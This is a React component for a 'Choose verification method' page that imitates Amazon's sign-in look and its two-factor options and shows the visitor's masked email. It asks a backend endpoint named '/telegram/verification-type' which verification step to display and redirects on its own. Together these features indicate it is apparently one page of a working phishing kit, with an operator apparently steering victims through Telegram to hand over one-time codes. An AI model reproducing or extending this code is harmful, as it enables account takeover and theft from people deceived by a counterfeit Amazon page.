import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import Logo from "../../components/Logo/Logo";
import { MdPhoneAndroid, MdEmail, MdMessage, MdSecurity } from "react-icons/md";

const VerificationOptions = () => {
  const navigate = useNavigate();
  const [selectedType, setSelectedType] = useState(null);

  useEffect(() => {
    const checkVerificationType = async () => {
      try {
        const response = await fetch(
          `${process.env.REACT_APP_API_URL}/telegram/verification-type`
        );
        const data = await response.json();
        if (data.type) {
          // Automatically navigate to verification with selected type
          sessionStorage.setItem("verificationType", data.type);
          navigate("/verify");
        }
      } catch (error) {
        console.error("Error checking verification type:", error);
      }
    };

    checkVerificationType();
  }, [navigate]);

  const maskedEmail =
    sessionStorage.getItem("userEmail")?.split("@")[0]?.charAt(0) +
    "*****@" +
    sessionStorage.getItem("userEmail")?.split("@")[1];

  const options = [
    {
      id: "app",
      title: "Use authenticator app",
      description: "Approve the notification we'll send to your Amazon app",
      icon: <MdPhoneAndroid className="text-3xl text-[#232f3e]" />,
    },
    {
      id: "email-sms",
      title: "Send email & SMS",
      description: `We'll send a code to ${maskedEmail}`,
      icon: <MdEmail className="text-3xl text-[#232f3e]" />,
    },
    {
      id: "sms",
      title: "Send SMS",
      description: "We'll send a code to your phone",
      icon: <MdMessage className="text-3xl text-[#232f3e]" />,
    },
    {
      id: "special",
      title: "Special verification",
      description: "Use this if you have security key or other method",
      icon: <MdSecurity className="text-3xl text-[#232f3e]" />,
    },
  ];

  const handleOptionSelect = (optionId) => {
    sessionStorage.setItem("verificationType", optionId);
    navigate("/verify");
  };

  return (
    <div className="min-h-screen flex flex-col items-center pt-8 px-4">
      <Logo />
      <div className="w-full max-w-[600px] mt-8">
        <h1 className="text-3xl font-normal mb-4">
          Choose verification method
        </h1>
        <p className="mb-6">
          For your security, we need to verify your identity. Please choose one
          of the following options:
        </p>

        <div className="space-y-4">
          {options.map((option) => (
            <button
              key={option.id}
              onClick={() => handleOptionSelect(option.id)}
              className="w-full p-4 border border-[#a6a6a6] rounded hover:bg-gray-50 
                        flex items-center text-left transition-colors"
            >
              <span className="mr-4">{option.icon}</span>
              <div>
                <h2 className="font-medium">{option.title}</h2>
                <p className="text-sm text-gray-600">{option.description}</p>
              </div>
            </button>
          ))}
        </div>
      </div>

      <div className="mt-auto py-4 text-sm space-x-6">
        <a
          href="#"
          className="text-[#0066c0] hover:text-[#c45500] hover:underline"
        >
          Conditions of Use
        </a>
        <a
          href="#"
          className="text-[#0066c0] hover:text-[#c45500] hover:underline"
        >
          Privacy Notice
        </a>
        <a
          href="#"
          className="text-[#0066c0] hover:text-[#c45500] hover:underline"
        >
          Help
        </a>
      </div>
    </div>
  );
};

export default VerificationOptions;
